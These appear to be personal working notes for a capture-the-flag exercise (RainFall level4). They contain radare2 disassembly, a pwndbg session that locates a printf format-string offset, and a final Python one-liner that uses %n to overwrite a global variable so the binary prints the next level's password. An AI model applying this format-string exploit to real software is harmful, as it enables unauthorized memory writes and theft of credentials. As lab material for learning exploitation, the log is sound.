# Research notes

This is the working log, including experiments that did not succeed. The verified VM procedure is in `../walkthrough`. Addresses from local experiments may differ from the ISO VM.

```bash
16:32:16 ✔ abelov:(main)~/.../RainFall/level4$ r2 -Ad ./level4 2>/dev/null
-- How about Global Thermonuclear War?
[0xf3ff78a0]> pdf @ sym.n
; CALL XREF from main @ 0x80484ad(x)
┌ 80: sym.n ();
│ afv: vars(3:sp[0x20c..0x218])
│           0x08048457      55             push ebp
│           0x08048458      89e5           mov ebp, esp
│           0x0804845a      81ec18020000   sub esp, 0x218
│           0x08048460      a104980408     mov eax, dword [obj.stdin]  ; loc.__bss_start
│                                                                      ; [0x8049804:4]=0
0x08048469      c744240400..   mov dword [var_4h], eflags  ; [0x200:4]=-1
│           0x08048471      8d85f8fdffff   lea eax, [var_208h]
│           0x08048477      890424         mov dword [esp], eax
│           0x0804847a      e8d1feffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│           0x0804847f      8d85f8fdffff   lea eax, [var_208h]
│           0x08048485      890424         mov dword [esp], eax
│           0x08048488      e8b7ffffff     call sym.p
│           0x0804848d      a110980408     mov eax, dword [obj.m]      ; [0x8049810:4]=0
│           0x08048492      3d44550201     cmp eax, 0x1025544
│       ┌─< 0x08048497      750c           jne 0x80484a5
│       │   0x08048499      c704249085..   mov dword [esp], str._bin_cat__home_user_level5_.pass ; [0x8048590:4]=0x6e69622f ; "/bin/cat /home/user/level5/.pass"
│       │   0x080484a0      e8bbfeffff     call sym.imp.system         ; int system(const char *string)
│       └─> 0x080484a5      c9             leave
└           0x080484a6      c3             ret
[0xf3ff78a0]> pdf @ sym.p
; CALL XREF from sym.n @ 0x8048488(x)
(int32_t arg_8h);
│ `- args(sp[0x4..0x4])
│           0x08048444      55             push ebp
│           0x08048445      89e5           mov ebp, esp
│           0x08048447      83ec18         sub esp, 0x18
│           0x0804844a      8b4508         mov eax, dword [arg_8h]
│           0x0804844d      890424         mov dword [esp], eax
│           0x08048450      e8ebfeffff     call sym.imp.printf         ; int printf(const char *format, ...)
[0xf3ff78a0]> pdf @ sym.main
; DATA XREF from entry0 @ 0x80483a7(w)
┌ 13: int main (int argc, char **argv, char **envp);
│           0x080484a7      55             push ebp
│           0x080484a8      89e5           mov ebp, esp
│           0x080484aa      83e4f0         and esp, 0xfffffff0
│           0x080484ad      e8a5ffffff     call sym.n
│           0x080484b2      c9             leave
└           0x080484b3      c3             ret
[0xf3ff78a0]>

```



```bash

set *0xffffc4f8 = 0x00000000
set *0xffffc4f4 = 0x0a0a0a0a
set *0xffffc4f0 = 0x41414141

set $pc = *p + 12
br *p + 17

```


```bash
pwndbg> set args < <(python2.7 -c 'print "BBBB" + " 0x%x"*14')
pwndbg> r

pwndbg> stack -i 140
8b:022c│+014 0xffffc70c —▸ 0xf7d87519 (__libc_start_call_main+121) ◂— add esp, 0x10
8a:0228│+010 0xffffc708 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0
89:0224│+00c 0xffffc704 ◂— 0
88:0220│+008 0xffffc700 ◂— 0
87:021c│+004 0xffffc6fc —▸ 0x80484b2 (main+11) ◂— leave
86:0218│ ebp 0xffffc6f8 —▸ 0xffffc708 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0
85:0214│-004 0xffffc6f4 ◂— 0
... ↓        skipped
04:0010│ eax 0xffffc4f0 ◂— 'BBBB 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x\n'
03:000c│-20c 0xffffc4ec ◂— 0
02:0008│-210 0xffffc4e8 —▸ 0xf7f90620 (_IO_2_1_stdin_) ◂— 0xfbad2088
01:0004│-214 0xffffc4e4 ◂— 0x200
00:0000│ esp 0xffffc4e0 —▸ 0xffffc4f0 ◂— 'BBBB 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x\n'
pwndbg> i addr m
Symbol "m" is at 0x8049810 in a file compiled without debugging.
pwndbg> p/d 0x1025544
$3 = 16930116

pwndbg> c
Continuing.
BBBB 0xf7fd9004 0xffffc730 0xf7f90000 0xffffc7c4 0xf7ffcb80 0xffffc6f8 0x804848d 0xffffc4f0 0x200 0xf7f90620 0x340 0x42424242 0x25783020 0x78302078
Dump of assembler code for function p:
0x08048444 <+0>:	push   ebp
0x08048445 <+1>:	mov    ebp,esp
0x08048447 <+3>:	sub    esp,0x18
0x0804844a <+6>:	mov    eax,DWORD PTR [ebp+0x8]
0x0804844d <+9>:	mov    DWORD PTR [esp],eax
0x08048450 <+12>:	call   0x8048340 <printf@plt>
End of assembler dump.

Breakpoint 5, 0x08048455 in p ()


```

```bash
(python2.7 -c 'import struct; \
  print struct.pack("<I",0x8049810) + "%12$-16930107X %12$n"'; cat ) | ./level4
```
